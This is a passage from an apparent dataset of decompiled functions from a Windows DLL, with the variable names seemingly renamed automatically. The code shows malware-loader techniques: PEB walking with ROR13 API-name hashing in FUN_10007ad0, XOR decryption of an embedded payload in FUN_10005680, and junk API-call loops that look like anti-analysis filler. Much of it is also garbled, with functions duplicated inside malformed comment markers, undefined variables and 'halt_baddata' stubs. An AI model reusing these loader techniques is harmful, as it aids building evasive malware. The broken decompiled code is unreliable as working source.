0x1000) {\n            puVar10 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7);\n        } else {\n            uint uVar5 = uVar7 + 0x23;\n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff;\n            }\n            int iVar6 = FUN_10013cf9(uVar5);\n            if (iVar6 == 0) goto LAB_10004fe3;\n            puVar10 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0);\n            *(int *)((int)puVar10 - 4) = iVar6;\n        }\n        *(uint *)((int)this + 0x10) = uVar1 + param_1;\n        *(uint *)((int)this + 0x14) = uVar8;\n        undefined8 *puVar9 = (undefined8 *)((int)puVar10 + uVar1);\n        if (uVar2 < 0x10) {\n            FUN_10018670(puVar10, (undefined8 *)this, uVar1);\n            FUN_10018670(puVar9, param_3, param_4);\n            *(undefined *)(param_4 + (int)puVar9) = 0;\n            *(undefined8 **)this = puVar10;\n            return (undefined8 *)this;\n        }\n        void *puVar3 = *this;\n        FUN_10018670(puVar10, puVar3, uVar1);\n        FUN_10018670(puVar9, param_3, param_4);\n        *(undefined *)(param_4 + (int)puVar9) = 0;\n        if ((uVar2 + 1 < 0x1000) || ((uint)((int)puVar3 + (-4 - (int)*(undefined8 **)((int)puVar3 - 4))) < 0x20)) {\n            FUN_10013ceb(*(undefined8 **)((int)puVar3 - 4));\n            *(undefined8 **)this = puVar10;\n            return (undefined8 *)this;\n        }\n    }\nLAB_10004fe3:\n    FUN_1001dea6();\n    code *pcVar4 = (code *)swi(3);\n    return (undefined8 *)(*pcVar4)();\n}"}
{"Function Name": "FUN_10005240", "Address": "10005240", "Source Code": "void __fastcall call_function_fast(int *input_pointer) \n{\n    if (*(undefined4 **)input_pointer != (undefined4 *)0x0) { \n        (***(code ***)input_pointer)(1); \n    }\n}"}
{"Function Name": "FUN_10005250", "Address": "10005250", "Source Code": "void handleError(void) \n{\n    logError(\"vector<T> too long\"); \n    ((code *)systemCall(3))(); \n}"}
{"Function Name": "FUN_10005260", "Address": "10005260", "Source Code": "void handleError(void) \n{\n    logError(\"string too long\"); \n    ((code *)softwareInterrupt(3))(); \n}"}
{"Function Name": "FUN_10005270", "Address": "10005270", "Source Code": "uint __thiscall FUN_10005270(void *object_pointer, uint input_value)\n{\n    \n    uint combined_value = input_value | 0xf;\n    \n    if (combined_value < 0x80000000) {\n        \n        uint retrieved_value = *(uint *)((int)object_pointer + 0x14);\n        \n        if (retrieved_value <= 0x7fffffff - (retrieved_value >> 1)) {\n            \n            retrieved_value = (retrieved_value >> 1) + retrieved_value;\n            \n            if (combined_value < retrieved_value) {\n                combined_value = retrieved_value;\n            }\n        }\n    }\n    \n    return combined_value < 0x80000000 ? combined_value : 0x7fffffff;\n}"}
{"Function Name": "FUN_100052b0", "Address": "100052b0", "Source Code": "int * __thiscall FUN_100052b0(void *instance, byte byteParam)\n{\n    int *intPointer; \n    int integerValue; \n    uint unsignedReturnValue; \n    void *originalExceptionList; \n    originalExceptionList = exceptionList; \n    exceptionList = &originalExceptionList; \n    integerValue = *instance; \n    intPointer = *(int **)(*(int *)(integerValue + 4) + 0x38 + (int)instance); \n    if (intPointer != (int *)0x0) { \n        (**(code **)(*intPointer + 4))(); \n    }\n    if ((*(int *)(*(int *)(integerValue + 4) + 0xc + (int)instance) == 0) && \n        (intPointer = *(int **)(*(int *)(integerValue + 4) + 0x3c + (int)instance), intPointer != (int *)0x0) && \n        (intPointer != (int *)instance)) { \n        FUN_100041d0(intPointer); \n    }\n    if (*(int *)(*(int *)(integerValue + 4) + 0xc + (int)instance) != 0) { \n        FUN_10002180((void *)(*(int *)(*instance + 4) + (int)instance), \n                     *(uint *)(*(int *)(*instance + 4) + 0xc + (int)instance) | 4, '\\0');\n        if (!___uncaught_exception()) { \n            FUN_100042a0((int *)instance); \n        }\n        intPointer = *(int **)(*(int *)(*instance + 4) + 0x38 + (int)instance); \n        if (intPointer != (int *)0x0) { \n            (**(code **)(*intPointer + 8))(); \n        }\n        exceptionList = originalExceptionList; \n        return (int *)instance; \n    }\n    intPointer = *(int **)(*(int *)(integerValue + 4) + 0x38 + (int)instance); \n    if (*(int *)intPointer[8] != 0) { \n        integerValue = *(int *)intPointer[0xc]; \n        if (0 < integerValue) { \n            *(int *)intPointer[0xc] = integerValue - 1; \n            *(byte **)intPointer[8] += 1; \n            *(*(byte **)intPointer[8] - 1) = byteParam; \n            unsignedReturnValue = (byteParam != 0xffffffff) ? 0 : 4; \n            return (int *)FUN_100053c8(0, unsignedReturnValue); \n        }\n    }\n    integerValue = (**(code **)(*intPointer + 0xc))(byteParam); \n    unsignedReturnValue = (integerValue != -1) ? 0 : 4; \n    return (int *)FUN_100053c8(0, unsignedReturnValue); \n}"}
{"Function Name": "Catch_All@100053a4", "Address": "100053a4", "Source Code": "undefined * catchAllFunction(void) \n{\n    \n    functionCall((void *)(*(int *)(**(int **)(basePointer + -0x14) + 4) + \n    (int)*(int **)(basePointer + -0x14)), \n    4, \n    '\\x01'); \n    \n    return &globalVariable; \n}"}
{"Function Name": "FUN_100053c8", "Address": "100053c8", "Source Code": "void __fastcall FUN_100053c8(undefined4 input_param, uint flag)\n{\n    void *current_instance; \n    int *int_pointer; \n    \n    current_instance = (void *)(*(int *)(*external_context + 4) + (int)external_context);\n    \n    if (*(int *)((int)current_instance + 0x38) == 0) {\n        flag = external_value; \n    }\n    \n    process_instance(current_instance, *(uint *)(*(int *)(*external_context + 4) + 0xc + (int)external_context) | flag, '\\0');\n    \n    if (!check_uncaught_exceptions()) {\n        handle_no_exceptions(external_context); \n    }\n    \n    int_pointer = *(int **)(*(int *)(*external_context + 4) + 0x38 + (int)external_context);\n    \n    if (int_pointer != (int *)0x0) {\n        (**(code **)(*int_pointer + 8))(); \n    }\n    return; \n}"}
{"Function Name": "FUN_10005430", "Address": "10005430", "Source Code": "undefined __thiscall FUN_10005430(void *objectInstance, undefined4 inputParam)\n{\n    undefined returnValue; \n    int *intPointer; \n    undefined4 *undefinedPointer; \n    int *localIntPointer; \n    \n    localIntPointer = *(int **)(*(int *)((int)objectInstance + 0x30) + 4);\n    \n    \n    (**(code **)(*localIntPointer + 4))(DAT_1004e008 ^ (uint)&stack0xfffffffc);\n    \n    \n    intPointer = (int *)FUN_100043b0(NULL);\n    \n    \n    returnValue = (**(code **)(*intPointer + 0x20))(inputParam);\n    \n    \n    if (localIntPointer != (int *)0x0) {\n        \n        undefinedPointer = (undefined4 *)(**(code **)(*localIntPointer + 8))();\n        \n        \n        if (undefinedPointer != (undefined4 *)0x0) {\n            (**(code **)*undefinedPointer)(1);\n        }\n    }\n    \n    \n    return returnValue;\n}"}
{"Function Name": "FUN_100054c0", "Address": "100054c0", "Source Code": "void __thiscall FUN_100054c0(void *this, undefined4 param_1, char isGroupingEnabled)\n{\n    char currentChar; \n    undefined undefinedValue; \n    code *codePointer; \n    lconv *localeConvPtr; \n    int allocatedMemorySize; \n    int loopCounter; \n    char *groupingStringPtr; \n    undefined1 *undefinedPtr; \n    char *endGroupingStringPtr; \n    void *originalExceptionList; \n    originalExceptionList = currentExceptionList; \n    currentExceptionList = &originalExceptionList; \n    localeConvPtr = _localeconv(); \n    __Getcvt((_Cvtvec *)&stack0xffffffb8); \n    *(undefined4 *)((int)this + 8) = 0; \n    *(undefined4 *)((int)this + 0x10) = 0; \n    *(undefined4 *)((int)this + 0x14) = 0; \n    __Getcvt((_Cvtvec *)&stack0xffffffb8); \n    groupingStringPtr = (isGroupingEnabled == '\\0') ? localeConvPtr->grouping : \"\"; \n    endGroupingStringPtr = groupingStringPtr; \n    while (*endGroupingStringPtr != '\\0') { \n        endGroupingStringPtr++; \n    }\n    allocatedMemorySize = FUN_1001df20((uint)(endGroupingStringPtr - groupingStringPtr + 1), 1); \n    if (allocatedMemorySize == 0) { \n        FUN_1001486c(); \n    } else {\n        if (endGroupingStringPtr != (char *)0x0) { \n            loopCounter = allocatedMemorySize - (int)groupingStringPtr; \n            do {\n                currentChar = *groupingStringPtr; \n                groupingStringPtr++; \n                groupingStringPtr[loopCounter - 1] = currentChar; \n                endGroupingStringPtr--; \n            } while (endGroupingStringPtr != (char *)0x0); \n        }\n    }\n    *(int *)((int)this + 8) = allocatedMemorySize; \n    groupingStringPtr = \"false\"; \n    allocatedMemorySize = FUN_1001df20(6, 1); \n    if (allocatedMemorySize != 0) { \n        for (loopCounter = 6; loopCounter > 0; loopCounter--) { \n            currentChar = *groupingStringPtr++; \n            groupingStringPtr[allocatedMemorySize - 0x10047901] = currentChar; \n        }\n    }\n    *(int *)((int)this + 0x10) = allocatedMemorySize; \n    undefinedPtr = &DAT_10047908; \n    allocatedMemorySize = FUN_1001df20(5, 1); \n    if (allocatedMemorySize != 0) { \n        for (loopCounter = 5; loopCounter > 0; loopCounter--) { \n            undefinedValue = *undefinedPtr++; \n            undefinedPtr[allocatedMemorySize - 0x10047909] = undefinedValue; \n        }\n    }\n    *(int *)((int)this + 0x14) = allocatedMemorySize; \n    if (isGroupingEnabled == '\\0') { \n        *(char *)((int)this + 0xc) = *localeConvPtr->decimal_point; \n        *(char *)((int)this + 0xd) = *localeConvPtr->thousands_sep; \n        currentExceptionList = originalExceptionList; \n        return; \n    }\n    *(undefined2 *)((int)this + 0xc) = 0x2c2e; \n    currentExceptionList = originalExceptionList; \n}"}
{"Function Name": "Catch_All@10005638", "Address": "10005638", "Source Code": "void handleAllExceptions(void)\n{\n    \n    executeFunction(*(int *)(basePointer + -0x14));\n    \n    \n    throwException((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)softwareInterrupt(3))();\n    \n    \n    return;\n}"}
{"Function Name": "FUN_10005670", "Address": "10005670", "Source Code": "\\*\nundefined * __fastcall FUN_10005670(undefined *memory_pointer)\n{\n    \n    \n    return memset(memory_pointer, 0, sizeof(*memory_pointer));\n}\n*\\ \n \nundefined * __fastcall FUN_10005670(undefined *memory_pointer)\n{\n    return memset(memory_pointer, 0, sizeof(*memory_pointer));\n}"}
{"Function Name": "FUN_10005680", "Address": "10005680", "Source Code": "\\*\nbyte * __fastcall FUN_10005680(undefined4 param_1)\n{\n    int globalVar = DAT_10050480; \n    size_t size; \n    code *functionPtr = (code *)FUN_10007ad0(param_1, 0x3bd09a55); \n    int *intArray = (int *)(*functionPtr)(globalVar, 0xc9, 2); \n    size = intArray[1]; \n    byte *allocatedMemory = (byte *)FUN_10013d51(size); \n    if (allocatedMemory != (byte *)0x0) { \n        memset(allocatedMemory, 0, size); \n        int offset = *intArray + globalVar + 0x67; \n        if (offset != 0) { \n            for (size_t loopIndex = size; loopIndex != 0; loopIndex--) { \n                allocatedMemory[size - loopIndex] = allocatedMemory[loopIndex + offset - (int)allocatedMemory]; \n            }\n        }\n        for (uint index = 0; index < 0x23400; index += 6) { \n            \n            allocatedMemory[index] ^= *(byte *)(local_54 + (index & 0xf));\n            allocatedMemory[index + 1] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (1 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 2] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (2 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 3] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (3 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 4] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (4 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 5] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (5 - (int)allocatedMemory)) & 0xf));\n        }\n        for (uint index = 0; index < 0x23400; index += 6) { \n            allocatedMemory[index] ^= *(byte *)(local_94 + (index & 0xf));\n            allocatedMemory[index + 1] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (1 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 2] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (2 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 3] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (3 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 4] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (4 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 5] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (5 - (int)allocatedMemory)) & 0xf));\n        }\n    }\n    return allocatedMemory; \n}\n*\\ \n \nbyte * __fastcall FUN_10005680(undefined4 param_1)\n{\n    int globalVar = DAT_10050480;\n    size_t size;\n    code *functionPtr = (code *)FUN_10007ad0(param_1, 0x3bd09a55);\n    int *intArray = (int *)(*functionPtr)(globalVar, 0xc9, 2);\n    size = intArray[1];\n    byte *allocatedMemory = (byte *)FUN_10013d51(size);\n    if (allocatedMemory != (byte *)0x0) {\n        memset(allocatedMemory, 0, size);\n        int offset = *intArray + globalVar + 0x67;\n        if (offset != 0) {\n            for (size_t loopIndex = size; loopIndex != 0; loopIndex--) {\n                allocatedMemory[size - loopIndex] = allocatedMemory[loopIndex + offset - (int)allocatedMemory];\n            }\n        }\n        for (uint index = 0; index < 0x23400; index += 6) {\n            allocatedMemory[index] ^= *(byte *)(local_54 + (index & 0xf));\n            allocatedMemory[index + 1] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (1 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 2] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (2 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 3] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (3 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 4] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (4 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 5] ^= *(byte *)(local_54 + ((uint)(allocatedMemory + (5 - (int)allocatedMemory)) & 0xf));\n        }\n        for (uint index = 0; index < 0x23400; index += 6) {\n            allocatedMemory[index] ^= *(byte *)(local_94 + (index & 0xf));\n            allocatedMemory[index + 1] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (1 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 2] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (2 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 3] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (3 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 4] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (4 - (int)allocatedMemory)) & 0xf));\n            allocatedMemory[index + 5] ^= *(byte *)(local_94 + ((uint)(allocatedMemory + (5 - (int)allocatedMemory)) & 0xf));\n        }\n    }\n    return allocatedMemory;\n}"}
{"Function Name": "FUN_10005870", "Address": "10005870", "Source Code": "int __fastcall FUN_10005870(char *input_string)\n{\n    int length_counter = 0; \n    while (*input_string != '\\0') { \n        input_string++; \n        length_counter++; \n    }\n    return length_counter; \n}"}
{"Function Name": "FUN_10005880", "Address": "10005880", "Source Code": "int FUN_10005880(void) \n{\n    int firstInteger; \n    int secondInteger; \n    code *functionPointer = CountClipboardFormats_exref; \n    float initialValue = DAT_10048778; \n    float currentValue = DAT_10048728; \n    float thresholdValue = DAT_100487b8; \n    float localValue = DAT_10048728; \n    double doubleValue; \n    while (true) { \n        doubleValue = (double)(ulonglong)(uint)currentValue; \n        if (thresholdValue <= initialValue) { \n            FUN_10037dc0(); \n            initialValue = (float)doubleValue; \n            do {\n                GetFocus(); \n            } while (DAT_100487b8 <= initialValue); \n        }\n        if (initialValue <= DAT_100487cc) { \n            do {\n                (*functionPointer)(); \n                firstInteger = FUN_10005880(); \n                initialValue = (float)(int)(char)firstInteger; \n            } while (initialValue <= DAT_100487cc); \n        }\n        doubleValue = (double)(ulonglong)(uint)DAT_100487cc; \n        if (DAT_100487b8 <= localValue) { \n            FUN_10037dc0(); \n            localValue = (float)doubleValue; \n            do {\n                GetFocus(); \n            } while (DAT_100487b8 <= localValue); \n        }\n        if (localValue <= DAT_100487cc) { \n            do {\n                (*functionPointer)(); \n                secondInteger = FUN_10005880(); \n                localValue = (float)(int)(char)secondInteger; \n            } while (localValue <= DAT_100487cc); \n        }\n        localValue = (float)(int)(char)(int)localValue; \n        initialValue = (float)(int)(char)firstInteger - localValue; \n        float calculatedValue = (localValue * (float)(int)(char)firstInteger) / initialValue; \n        if (DAT_10048748 <= calculatedValue) { \n            SwitchToThread(); \n            FUN_10037dc0(); \n            float scaledValue = (float)(uint)(ulonglong)(float)initialValue * scalingFactor; \n            FUN_10037a8e(); \n            FUN_10037dc0(); \n            calculatedValue = scaledValue - (float)(double)(uint)(ulonglong)(float)scaledValue; \n            functionPointer = CountClipboardFormats_exref; \n        }\n        firstInteger = 8; \n        while (calculatedValue <= DAT_10048780) { \n            calculatedValue = (float)(firstInteger * 2) / (float)(int)(char)(int)((float)firstInteger + (float)(firstInteger * 2)); \n            firstInteger = 0; \n        }\n        firstInteger = 0x17; \n        thresholdValue = DAT_100487b8; \n        if (calculatedValue <= DAT_100487b8) { \n            secondInteger = 0x3b; \n            do {\n                firstInteger -= secondInteger; \n                currentValue = (float)firstInteger; \n                doubleValue = (double)(ulonglong)(uint)currentValue; \n                if (thresholdValue <= currentValue) { \n                    FUN_10037dc0(); \n                    currentValue = (float)doubleValue; \n                    do {\n                        GetFocus(); \n                    } while (DAT_100487b8 <= currentValue); \n                }\n                if (currentValue <= DAT_100487cc) { \n                    do {\n                        (*functionPointer)(); \n                        secondInteger = FUN_10005880(); \n                        currentValue = (float)(int)(char)secondInteger; \n                    } while (currentValue <= DAT_100487cc); \n                }\n                secondInteger = (int)(char)(int)currentValue; \n                calculatedValue = (float)(firstInteger / secondInteger); \n            } while (calculatedValue <= thresholdValue); \n        }\n        if ((NAN(calculatedValue) || NAN(comparisonValue)) == (calculatedValue == comparisonValue)) break; \n        if (DAT_10048724 <= calculatedValue) { \n            return (int)calculatedValue; \n        }\n    }\n    GetKBCodePage(); \n    return (int)returnValue; \n}"}
{"Function Name": "FUN_10005bb0", "Address": "10005bb0", "Source Code": "int processData(void) \n{\n    float currentFocusValue; \n    double tempDoubleValue; \n    undefined simdRegister[16]; \n    tempDoubleValue = simdRegister._0_8_; \n    \n    if (globalThreshold <= simdRegister._0_4_) {\n        FUN_10037dc0(); \n        do {\n            GetFocus(); \n            simdRegister = ZEXT416((uint)(float)tempDoubleValue); \n        } while (globalThreshold <= (float)tempDoubleValue); \n    }\n    currentFocusValue = simdRegister._0_4_; \n    \n    if (currentFocusValue <= maxClipboardFormats) {\n        do {\n            CountClipboardFormats(); \n            currentFocusValue = (float)(int)(char)FUN_10005880(); \n        } while (currentFocusValue <= maxClipboardFormats); \n    }\n    return (int)currentFocusValue; \n}"}
{"Function Name": "FUN_10005c50", "Address": "10005c50", "Source Code": "void __cdecl FUN_10005c50(uint inputValue, int statusCode)\n{\n    uint intermediateResult; \n    ulonglong resultValue; \n    \n    if (statusCode < 0) {\n        resultValue = CONCAT44(statusCode, inputValue); \n    } else if ((0 < statusCode) || (resultValue = CONCAT44(statusCode, inputValue), 0x74 < inputValue)) {\n        SetProcessDPIAware(); \n        GetCurrentThread(); \n        resultValue = FUN_10037c6f(); \n        \n        if (resultValue == 0x75) {\n            FUN_10037dc0(); \n            FUN_10005bb0(); \n            FUN_10005bb0(); \n        } else {\n            GetLogicalDrives(); \n            FUN_10005e30(0); \n        }\n        \n        do {\n            do {\n                GetForegroundWindow(); \n                FUN_10005880(); \n                resultValue = FUN_10037c6f(); \n            } while ((int)(resultValue >> 0x20) != 0 && -1 < (longlong)resultValue);\n        } while ((-1 < (longlong)resultValue) && (0x24 < (uint)resultValue));\n    }\n    \n    \n    if (resultValue == 0x73) {\n        GetCurrentProcessorNumber(); \n        int calculatedValue = FUN_10005880(); \n        calculatedValue = (int)(char)calculatedValue * (int)(char)calculatedValue * 2; \n        resultValue = (ulonglong)calculatedValue; \n        \n        if (calculatedValue == 0x14) {\n            FlushProcessWriteBuffers(); \n            FUN_10037dc0(); \n            resultValue = FUN_10037c6f(); \n            FUN_10005e30((int)resultValue); \n            FUN_10037dc0(); \n            FUN_10037dc0(); \n            resultValue = FUN_10037c6f(); \n        }\n        \n        if (resultValue != 0x58) {\n            GetMenuCheckMarkDimensions(); \n        }\n    }\n    \n    CoFreeUnusedLibraries(); \n    int counter = 0xe; \n    char accumulator = '\\x0e'; \n    int calculatedValue = 0x38; \n    \n    do {\n        do {\n            GetLastError(); \n            char quotient = (char)(counter / calculatedValue); \n            accumulator += quotient; \n            calculatedValue = (int)quotient; \n            counter = (int)accumulator; \n            intermediateResult = calculatedValue * counter; \n        } while ((int)intermediateResult >> 0x1f < 0); \n    } while ((-1 < (int)intermediateResult || (int)intermediateResult >> 0x1f < 0) && (intermediateResult < 9)); \n}"}
{"Function Name": "FUN_10005e30", "Address": "10005e30", "Source Code": "void __fastcall FUN_10005e30(int inputParam)\n{\n    int difference; \n    uint unsignedValue; \n    int anotherInteger; \n    double doubleValue; \n    float localFloat = DAT_10048700; \n    double localDouble = DAT_10048618; \n    \n    if (inputParam == 0x24) {\n        GetSystemDefaultUILanguage(); \n        FUN_10037dc0(); \n        float floatValue = (float)in_XMM0._0_8_ + localFloat; \n        float anotherFloat = (float)in_XMM0._0_8_ + floatValue; \n        FUN_10037a8e(); \n        FUN_10037dc0(); \n        difference = (int)(floatValue - anotherFloat); \n        \n        \n        if (difference == 0x53) {\n            unsignedValue = 4; \n            do {\n                doubleValue = anotherFloat; \n                FUN_10005c50(unsignedValue, (int)unsignedValue >> 0x1f); \n                FUN_10037dc0(); \n                localFloat = (float)(uint)(char)(int)(localFloat + (float)doubleValue); \n                difference = (int)((float)doubleValue - localFloat); \n                \n                \n                if ((0x33 < difference) || (difference < 0x15)) {\n                    difference = 0x68; \n                    do {\n                        FUN_10005e30(difference); \n                        FUN_10037dc0(); \n                        doubleValue = anotherFloat; \n                        difference = (int)doubleValue; \n                    } while (difference < 0x15); \n                }\n            } while (difference == 0x53); \n        }\n    }\n    \n    if (difference < 0x7a) {\n        GdiFlush(); \n        FUN_10005880(); \n        anotherInteger = 0x2b; \n        do {\n            GetDialogBaseUnits(); \n            difference = anotherInteger * 2; \n            anotherInteger = (int)(char)(int)((float)difference - localFloat); \n            localFloat = (float)anotherInteger; \n            difference = (int)(localFloat + (float)difference); \n        } while (0x7c < difference); \n        \n        longlong longValue = 0x39; \n        while (0x3b < difference) { \n            GetOEMCP(); \n            unsignedValue = (uint)((ulonglong)longValue >> 0x20); \n            longValue = __allmul((uint)longValue, unsignedValue, (uint)longValue, unsignedValue); \n            difference = (int)__alldiv(1, 0, (uint)longValue, (uint)((ulonglong)longValue >> 0x20)); \n        }\n    }\n    \n    if (difference == 0x25) {\n        difference = FUN_10005bb0(); \n        difference = ((char)difference - 7) * (int)(char)difference; \n    }\n    \n    if (difference < 0xb) {\n        CloseClipboard(); \n        FUN_10005880(); \n    }\n    do {\n        float floatValue = (float)localDouble; \n        do {\n            doubleValue = localDouble; \n            CoFreeUnusedLibraries(); \n            FUN_10005e30((int)localFloat); \n            FUN_10037dc0(); \n            localFloat = (float)doubleValue; \n            floatValue = (float)localDouble; \n            doubleValue = (double)(ulonglong)(uint)floatValue; \n            \n            if (DAT_100487b8 <= floatValue) {\n                FUN_10037dc0(); \n                floatValue = (float)doubleValue; \n                do {\n                    GetFocus(); \n                } while (DAT_100487b8 <= floatValue); \n            }\n            \n            if (floatValue <= DAT_100487cc) {\n                do {\n                    CountClipboardFormats(); \n                    difference = FUN_10005880(); \n                    floatValue = (float)(int)(char)difference; \n                } while (floatValue <= DAT_100487cc); \n            }\n            localDouble = (double)(int)(char)(int)floatValue; \n            difference = (int)((double)localFloat / localDouble); \n            float anotherFloat = DAT_100487c8; \n            \n            while (difference < 0x49) {\n                floatValue = anotherFloat * anotherFloat; \n                anotherFloat = floatValue; \n                difference = (int)floatValue; \n            }\n            \n            if (difference < 7) {\n                \n                if (difference != 0x35) goto LAB_10006111; \n                difference = FUN_10005880(); \n                char charValue = (char)difference; \n                floatValue = (float)((int)charValue / (int)(char)(charValue * charValue)); \n                floatValue = (float)(int)(char)(charValue * charValue) / _DAT_10048790 + floatValue; \n            } else {\n                GetUserDefaultLangID(); \n            LAB_10006111:\n                GetMessageTime(); \n                char charValue = FUN_10005c50(0x3e, 0); \n                floatValue = (float)(0x7c - charValue) - 0.0; \n            }\n        } while (((int)floatValue == 0x61) || ((int)floatValue != 0x3d)); \n        difference = 0x50; \n        do {\n            GetDesktopWindow(); \n            FUN_10005e30(difference); \n            FUN_10037dc0(); \n            doubleValue = localDouble; \n            difference = (int)doubleValue; \n        } while (difference < 0x72); \n        \n        if (0x72 < difference) {\n            return; \n        }\n    } while (true); \n}"}
{"Function Name": "FUN_10006210", "Address": "10006210", "Source Code": "int __fastcall FUN_10006210(int input_param, char *input_buffer)\n{\n    int memory_value; \n    uint value_count; \n    uint function_result; \n    uint loop_index; \n    byte *byte_pointer; \n    int *int_pointer; \n    uint counter = 0; \n    ushort *ushort_pointer; \n    \n    memory_value = *(int *)(*(int *)(input_param + 0x3c) + 0x78 + input_param);\n    if (memory_value == 0) { \n        return memory_value; \n    }\n    \n    ushort_pointer = (ushort *)(*(int *)(memory_value + 0x24 + input_param) + input_param);\n    \n    value_count = *(uint *)(memory_value + 0x18 + input_param);\n    \n    int_pointer = (int *)(*(int *)(memory_value + 0x1c + input_param) + input_param);\n    if (value_count != 0) { \n        do {\n            \n            function_result = FUN_10005870(input_buffer);\n            if (input_buffer != (char *)0x0) { \n                loop_index = 0; \n                if (function_result == 0) break; \n                byte_pointer = (byte *)0x0; \n                while (true) {\n                    if (byte_pointer == (byte *)0x0) break; \n                    if (function_result <= loop_index) goto LAB_1000629a; \n                    loop_index++; \n                    byte_pointer++; \n                }\n            }\n            counter++; \n            ushort_pointer++; \n        } while (counter < value_count); \n    }\nLAB_1000629a:\n    if (*ushort_pointer != 0) { \n        int_pointer += *ushort_pointer; \n    }\n    return *int_pointer + input_param; \n}"}
{"Function Name": "FUN_100062e0", "Address": "100062e0", "Source Code": "void FUN_100062e0(undefined1 input_data_1[16], undefined1 input_data_2[16], undefined1 input_data_3[16])\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "Catch_All@100071fb", "Address": "100071fb", "Source Code": "undefined * Catch_All_100071fb(void) \n{\n    int inputValue; \n    int basePointer; \n    int offsetValue; \n    uint unsignedValue; \n    double calculatedDouble; \n    \n    if (*(double *)(basePointer + -0x58) <= DAT_100486e8) {\n        FUN_10005bb0(); \n    }\n    offsetValue = 0x60; \n    *(undefined4 *)(basePointer + -0x6c) = 0; \n    inputValue = 0x41; \n    do {\n        InSendMessage(); \n        calculatedDouble = (double)(ulonglong)(uint)(float)(inputValue + offsetValue); \n        inputValue = FUN_10005bb0(); \n        unsignedValue = (uint)(char)inputValue; \n        *(uint *)(basePointer + -0x18) = unsignedValue; \n        *(uint *)(basePointer + -0x2c) = unsignedValue * unsignedValue; \n        __alldiv(unsignedValue, (int)unsignedValue >> 0x1f, *(uint *)(basePointer + -0x2c), (int)(unsignedValue * unsignedValue) >> 0x1f); \n        FUN_10037dc0(); \n    } while (calculatedDouble <= DAT_100486f0); \n    *(double *)(basePointer + -0x58) = calculatedDouble; \n    return &LAB_10007288; \n}"}
{"Function Name": "FUN_10007a80", "Address": "10007a80", "Source Code": "void processData(void) \n{\n    handleBadData(); \n}"}
{"Function Name": "FUN_10007ad0", "Address": "10007ad0", "Source Code": "int __fastcall FUN_10007ad0(undefined4 input_param, uint input_count)\n{\n    undefined4 *entry_pointer; \n    uint intermediate_result; \n    int first_integer; \n    int second_integer; \n    byte *byte_pointer; \n    char *char_pointer; \n    int *int_pointer; \n    uint remaining_count; \n    ushort *ushort_pointer; \n    \n    \n    entry_pointer = *(undefined4 **)(*(int *)((int)ProcessEnvironmentBlock + 0xc) + 0x14);\n    \n    \n    while (entry_pointer != (undefined4 *)0x0) {\n        byte_pointer = (byte *)entry_pointer[10]; \n        intermediate_result = 0; \n        remaining_count = (uint)*(ushort *)(entry_pointer + 9); \n        \n        \n        do {\n            intermediate_result = intermediate_result >> 0xd | intermediate_result << 0x13; \n            if (0x60 < *byte_pointer) { \n                intermediate_result = intermediate_result - 0x20; \n            }\n            intermediate_result = intermediate_result + *byte_pointer; \n            byte_pointer = byte_pointer + 1; \n            remaining_count = remaining_count - 1; \n        } while (remaining_count != 0); \n        \n        \n        if (intermediate_result == 0x6a4abc5b) break;\n        \n        entry_pointer = (undefined4 *)*entry_pointer; \n    }\n    \n    first_integer = entry_pointer[4]; \n    second_integer = *(int *)(*(int *)(first_integer + 0x3c) + 0x78 + first_integer) + first_integer; \n    int_pointer = (int *)(*(int *)(second_integer + 0x20) + first_integer); \n    ushort_pointer = (ushort *)(*(int *)(second_integer + 0x24) + first_integer); \n    \n    \n    while (true) {\n        intermediate_result = 0; \n        char_pointer = (char *)(*int_pointer + first_integer); \n        \n        \n        while (*char_pointer != '\\0') {\n            intermediate_result = (intermediate_result >> 0xd | intermediate_result << 0x13) + (int)*char_pointer; \n            char_pointer = char_pointer + 1; \n        }\n        \n        \n        if (intermediate_result == input_count) break;\n        \n        int_pointer = int_pointer + 1; \n        ushort_pointer = ushort_pointer + 1; \n    }\n    \n    \n    return *(int *)(*(int *)(second_integer + 0x1c) + (uint)*ushort_pointer * 4 + first_integer) + first_integer;\n}"}
{"Function Name": "FUN_10007b90", "Address": "10007b90", "Source Code": "undefined * getUndefinedPointer(void)\n{\n    \n    return globalUndefinedValue;\n}"}
